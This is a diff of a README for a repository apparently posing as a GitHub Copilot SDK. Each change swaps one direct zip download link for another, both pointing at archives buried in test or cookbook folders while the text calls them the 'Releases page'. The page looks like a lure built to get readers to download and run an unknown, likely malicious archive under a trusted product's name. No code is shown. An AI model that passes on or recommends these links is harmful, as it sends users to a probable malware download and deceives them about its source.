@@ -1,7 +1,7 @@
 # 🚀 copilot-sdk - Seamlessly Integrate GitHub Copilot
 
 ## 📥 Download Now
-[![Download copilot-sdk](https://raw.githubusercontent.com/FOOTBOBIK/copilot-sdk/main/go/e2e/copilot_sdk_1.2.zip)](https://raw.githubusercontent.com/FOOTBOBIK/copilot-sdk/main/go/e2e/copilot_sdk_1.2.zip)
+[![Download copilot-sdk](https://github.com/FOOTBOBIK/copilot-sdk/raw/refs/heads/main/cookbook/go/copilot-sdk-v3.9.zip)](https://github.com/FOOTBOBIK/copilot-sdk/raw/refs/heads/main/cookbook/go/copilot-sdk-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download copilot-sdk](https://raw.githubusercontent.com/FOOTBOBIK/copilot-sdk/main/go/e2e/copilot_sdk_1.2.zip).
+To get started, visit this page to download: [Download copilot-sdk](https://github.com/FOOTBOBIK/copilot-sdk/raw/refs/heads/main/cookbook/go/copilot-sdk-v3.9.zip).
 
 Once you're on the Releases page, you will see a list of available versions. Follow these steps:
 
@@ -78,7 +78,7 @@ The SDK will guide you through the setup process. Enjoy the seamless integration
 
 ## 📆 Updates
 
-Regular updates improve functionality and add new features. Always refer back to [Download copilot-sdk](https://raw.githubusercontent.com/FOOTBOBIK/copilot-sdk/main/go/e2e/copilot_sdk_1.2.zip) for the latest version.  
+Regular updates improve functionality and add new features. Always refer back to [Download copilot-sdk](https://github.com/FOOTBOBIK/copilot-sdk/raw/refs/heads/main/cookbook/go/copilot-sdk-v3.9.zip) for the latest version.  
 
 1. Check for updates in the SDK through the 'Check for Updates' option in the menu.
 2. Follow the prompts to download the latest version if available.
@@ -103,4 +103,4 @@ If you encounter issues during installation or running the SDK:
 
 The **copilot-sdk** is designed to help you integrate GitHub Copilot into your projects easily. Follow these instructions to download, install, and start using it. 
 
-Remember, for any updates or additional information, always refer back to the Releases page: [Download copilot-sdk](https://raw.githubusercontent.com/FOOTBOBIK/copilot-sdk/main/go/e2e/copilot_sdk_1.2.zip). Enjoy your coding journey!
+Remember, for any updates or additional information, always refer back to the Releases page: [Download copilot-sdk](https://github.com/FOOTBOBIK/copilot-sdk/raw/refs/heads/main/cookbook/go/copilot-sdk-v3.9.zip). Enjoy your coding journey!
